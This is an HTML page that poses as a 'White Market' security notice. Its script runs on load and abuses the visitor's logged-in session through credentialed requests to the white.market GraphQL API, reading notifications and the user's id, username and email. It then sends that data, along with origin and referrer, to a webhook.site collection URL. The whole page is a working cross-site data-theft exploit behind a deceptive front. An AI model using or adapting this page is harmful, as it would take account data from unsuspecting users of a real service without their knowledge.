<!DOCTYPE html>
<html>
<head><title>White Market - Security Notice</title></head>
<body>
    <h1>Updating security settings...</h1>
    <div id="debug"></div>
    <script>
        function log(msg) {
            document.getElementById('debug').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        async function exploit() {
            log('Starting exploit...');
            
            // DON'T try to read the cookie - it's HttpOnly
            // Just make authenticated requests
            
            try {
                // Test 1: Simple query
                const response1 = await fetch('https://api.white.market/graphql/api', {
                    method: 'POST',
                    credentials: 'include', // This sends the HttpOnly cookie
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        operationName: "UrgentAndUnreadNotifications",
                        query: "query UrgentAndUnreadNotifications { unread: notification_list_paginated(search: {isRead: false}) { totalCount } }"
                    })
                });
                
                const data1 = await response1.json();
                log('Notification check: ' + JSON.stringify(data1));
                
                // Test 2: User profile
                const response2 = await fetch('https://api.white.market/graphql/api', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        query: `query { 
                            me { 
                                id 
                                username 
                                email 
                            } 
                        }`
                    })
                });
                
                const data2 = await response2.json();
                log('User profile: ' + JSON.stringify(data2));
                
                // Send ALL results to webhook
                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84/info', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        notifications: data1,
                        profile: data2,
                        timestamp: new Date().toISOString(),
                        origin: window.location.origin,
                        referer: document.referrer
                    })
                });
                
            } catch(e) {
                log('ERROR: ' + e.message);
                
                await fetch('https://webhook.site/YOUR-UNIQUE-URL', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        error: e.message,
                        stack: e.stack
                    })
                });
            }
        }
        
        exploit();
    </script>
</body>
</html>
